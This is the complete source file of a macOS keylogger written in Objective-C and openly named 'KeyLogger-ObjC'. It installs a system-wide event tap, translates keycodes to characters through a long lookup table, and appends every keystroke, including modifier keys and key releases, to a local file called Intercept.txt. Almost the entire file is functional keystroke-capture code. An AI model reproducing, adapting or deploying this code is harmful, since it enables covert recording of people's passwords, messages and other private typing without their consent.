//
//  main.m
//  KeyLogger-ObjC
//
//  Created by Ryan Appel on 2/12/21.
//

#import <Foundation/Foundation.h>
#import <Carbon/Carbon.h>

NSArray* keys;

CGEventRef captureKeyStroke(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* pLogFile) {

    if (type != kCGEventKeyDown) {
        if (type != kCGEventKeyUp) {
            if (type != kCGEventFlagsChanged) {
                return event;
            }
        }
    }
    
    long long keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    NSString* key = keys[keycode];
    
    fprintf(pLogFile, "%s", [key UTF8String]);
    fflush(pLogFile);

    return event;
}


// see /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/Headers/Events.h
NSArray* getKeys() {
    NSArray* returnArray = @[];
    NSMutableArray* mutable = [returnArray mutableCopy];
    for (NSInteger i = 0; i < 255; i++) {
        [mutable addObject:[NSNull null]];
    }
    [mutable replaceObjectAtIndex:kVK_F1 withObject:@"<F1>"];
    [mutable replaceObjectAtIndex:kVK_ANSI_A withObject:@"a"];
    [mutable replaceObjectAtIndex:kVK_ANSI_S withObject:@"s"];
    [mutable replaceObjectAtIndex:kVK_ANSI_D withObject:@"d"];
    [mutable replaceObjectAtIndex:kVK_ANSI_F withObject:@"f"];
    [mutable replaceObjectAtIndex:kVK_ANSI_H withObject:@"h"];
    [mutable replaceObjectAtIndex:kVK_ANSI_G withObject:@"g"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Z withObject:@"z"];
    [mutable replaceObjectAtIndex:kVK_ANSI_X withObject:@"x"];
    [mutable replaceObjectAtIndex:kVK_ANSI_C withObject:@"c"];
    [mutable replaceObjectAtIndex:kVK_ANSI_V withObject:@"v"];
    [mutable replaceObjectAtIndex:kVK_ANSI_B withObject:@"b"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Q withObject:@"q"];
    [mutable replaceObjectAtIndex:kVK_ANSI_W withObject:@"w"];
    [mutable replaceObjectAtIndex:kVK_ANSI_E withObject:@"e"];
    [mutable replaceObjectAtIndex:kVK_ANSI_R withObject:@"r"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Y withObject:@"y"];
    [mutable replaceObjectAtIndex:kVK_ANSI_T withObject:@"t"];
    [mutable replaceObjectAtIndex:kVK_ANSI_1 withObject:@"1"];
    [mutable replaceObjectAtIndex:kVK_ANSI_2 withObject:@"2"];
    [mutable replaceObjectAtIndex:kVK_ANSI_3 withObject:@"3"];
    [mutable replaceObjectAtIndex:kVK_ANSI_4 withObject:@"4"];
    [mutable replaceObjectAtIndex:kVK_ANSI_6 withObject:@"6"];
    [mutable replaceObjectAtIndex:kVK_ANSI_5 withObject:@"5"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Equal withObject:@"="];
    [mutable replaceObjectAtIndex:kVK_ANSI_9 withObject:@"9"];
    [mutable replaceObjectAtIndex:kVK_ANSI_7 withObject:@"7"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Minus withObject:@"-"];
    [mutable replaceObjectAtIndex:kVK_ANSI_8 withObject:@"8"];
    [mutable replaceObjectAtIndex:kVK_ANSI_0 withObject:@"0"];
    [mutable replaceObjectAtIndex:kVK_ANSI_RightBracket withObject:@"]"];
    [mutable replaceObjectAtIndex:kVK_ANSI_O withObject:@"o"];
    [mutable replaceObjectAtIndex:kVK_ANSI_U withObject:@"u"];
    [mutable replaceObjectAtIndex:kVK_ANSI_LeftBracket withObject:@"["];
    [mutable replaceObjectAtIndex:kVK_ANSI_I withObject:@"i"];
    [mutable replaceObjectAtIndex:kVK_ANSI_P withObject:@"p"];
    [mutable replaceObjectAtIndex:kVK_ANSI_L withObject:@"l"];
    [mutable replaceObjectAtIndex:kVK_ANSI_J withObject:@"j"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Quote withObject:@"'"];
    [mutable replaceObjectAtIndex:kVK_ANSI_K withObject:@"k"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Semicolon withObject:@";"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Backslash withObject:@"\\"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Comma withObject:@","];
    [mutable replaceObjectAtIndex:kVK_ANSI_Slash withObject:@"/"];
    [mutable replaceObjectAtIndex:kVK_ANSI_N withObject:@"n"];
    [mutable replaceObjectAtIndex:kVK_ANSI_M withObject:@"m"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Period withObject:@"."];
    [mutable replaceObjectAtIndex:kVK_ANSI_Grave withObject:@"`"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadDecimal withObject:@"."];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadMultiply withObject:@"*"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadPlus withObject:@"+"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadClear withObject:@"<CLEAR>"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadDivide withObject:@"/"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadEnter withObject:@"<ENTER>"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadMinus withObject:@"-"];
    [mutable replaceObjectAtIndex:kVK_ANSI_KeypadEquals withObject:@"="];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad0 withObject:@"0"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad1 withObject:@"1"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad2 withObject:@"2"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad3 withObject:@"3"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad4 withObject:@"4"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad5 withObject:@"5"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad6 withObject:@"6"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad7 withObject:@"7"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad8 withObject:@"8"];
    [mutable replaceObjectAtIndex:kVK_ANSI_Keypad9 withObject:@"9"];
    [mutable replaceObjectAtIndex:kVK_Return withObject:@"<RETURN>"];
    [mutable replaceObjectAtIndex:kVK_Tab withObject:@"<TAB>"];
    [mutable replaceObjectAtIndex:kVK_Space withObject:@" "];
    [mutable replaceObjectAtIndex:kVK_Delete withObject:@"<DELETE>"];
    [mutable replaceObjectAtIndex:kVK_Escape withObject:@"<ESC>"];
    [mutable replaceObjectAtIndex:kVK_Command withObject:@"<CMD>"];
    [mutable replaceObjectAtIndex:kVK_Shift withObject:@"<SHIFT>"];
    [mutable replaceObjectAtIndex:kVK_CapsLock withObject:@"<CAPSLOCK>"];
    [mutable replaceObjectAtIndex:kVK_Option withObject:@"<OPT>"];
    [mutable replaceObjectAtIndex:kVK_Control withObject:@"<CTRL>"];
    [mutable replaceObjectAtIndex:kVK_RightCommand withObject:@"<R CMD>"];
    [mutable replaceObjectAtIndex:kVK_RightShift withObject:@"<R SHIFT>"];
    [mutable replaceObjectAtIndex:kVK_RightOption withObject:@"<R OPT>"];
    [mutable replaceObjectAtIndex:kVK_RightControl withObject:@"<R CTRL>"];
    [mutable replaceObjectAtIndex:kVK_Function withObject:@"<FN>"];
    [mutable replaceObjectAtIndex:kVK_F17 withObject:@"<F17>"];
    [mutable replaceObjectAtIndex:kVK_VolumeUp withObject:@"<VOL UP>"];
    [mutable replaceObjectAtIndex:kVK_VolumeDown withObject:@"<VOL DOWN>"];
    [mutable replaceObjectAtIndex:kVK_Mute withObject:@"<MUTE>"];
    [mutable replaceObjectAtIndex:kVK_F18 withObject:@"<F18>"];
    [mutable replaceObjectAtIndex:kVK_F19 withObject:@"<F19>"];
    [mutable replaceObjectAtIndex:kVK_F20 withObject:@"<F20>"];
    [mutable replaceObjectAtIndex:kVK_F5 withObject:@"<F5>"];
    [mutable replaceObjectAtIndex:kVK_F6 withObject:@"<F6>"];
    [mutable replaceObjectAtIndex:kVK_F7 withObject:@"<F7>"];
    [mutable replaceObjectAtIndex:kVK_F3 withObject:@"<F3>"];
    [mutable replaceObjectAtIndex:kVK_F8 withObject:@"<F8>"];
    [mutable replaceObjectAtIndex:kVK_F9 withObject:@"<F9>"];
    [mutable replaceObjectAtIndex:kVK_F11 withObject:@"<F11>"];
    [mutable replaceObjectAtIndex:kVK_F13 withObject:@"<F13>"];
    [mutable replaceObjectAtIndex:kVK_F16 withObject:@"<F16>"];
    [mutable replaceObjectAtIndex:kVK_F14 withObject:@"<F14>"];
    [mutable replaceObjectAtIndex:kVK_F10 withObject:@"<F10>"];
    [mutable replaceObjectAtIndex:kVK_F12 withObject:@"<F12>"];
    [mutable replaceObjectAtIndex:kVK_F15 withObject:@"<F15>"];
    [mutable replaceObjectAtIndex:kVK_Help withObject:@"<HELP>"];
    [mutable replaceObjectAtIndex:kVK_Home withObject:@"<HOME>"];
    [mutable replaceObjectAtIndex:kVK_PageUp withObject:@"<PG UP>"];
    [mutable replaceObjectAtIndex:kVK_ForwardDelete withObject:@"<FWD DEL>"];
    [mutable replaceObjectAtIndex:kVK_F4 withObject:@"<F4>"];
    [mutable replaceObjectAtIndex:kVK_End withObject:@"<END>"];
    [mutable replaceObjectAtIndex:kVK_F2 withObject:@"<F2>"];
    [mutable replaceObjectAtIndex:kVK_PageDown withObject:@"<PG DOWN>"];
    [mutable replaceObjectAtIndex:kVK_F1 withObject:@"<F1>"];
    [mutable replaceObjectAtIndex:kVK_LeftArrow withObject:@"<L ARROW>"];
    [mutable replaceObjectAtIndex:kVK_RightArrow withObject:@"<R ARROW>"];
    [mutable replaceObjectAtIndex:kVK_DownArrow withObject:@"<D ARROW>"];
    [mutable replaceObjectAtIndex:kVK_UpArrow withObject:@"<U ARROW>"];
    [mutable replaceObjectAtIndex:kVK_ISO_Section withObject:@"<ISO SECTION>"];
    [mutable replaceObjectAtIndex:kVK_JIS_Yen withObject:@"<YEN>"];
    [mutable replaceObjectAtIndex:kVK_JIS_Underscore withObject:@"_"];
    [mutable replaceObjectAtIndex:kVK_JIS_KeypadComma withObject:@","];
    [mutable replaceObjectAtIndex:kVK_JIS_Eisu withObject:@"<EISU>"];
    [mutable replaceObjectAtIndex:kVK_JIS_Kana withObject:@"<KANA>"];

    return [NSArray arrayWithArray:mutable];
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        FILE* pLogFile = fopen("Intercept.txt", "w+");
        keys = getKeys();
        CFMachPortRef eventTap = CGEventTapCreate(kCGHIDEventTap,
                                                  kCGHeadInsertEventTap,
                                                  0,
                                                  kCGEventMaskForAllEvents,
                                                  captureKeyStroke,
                                                  (void*)pLogFile);
        
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }
    return 0;
}
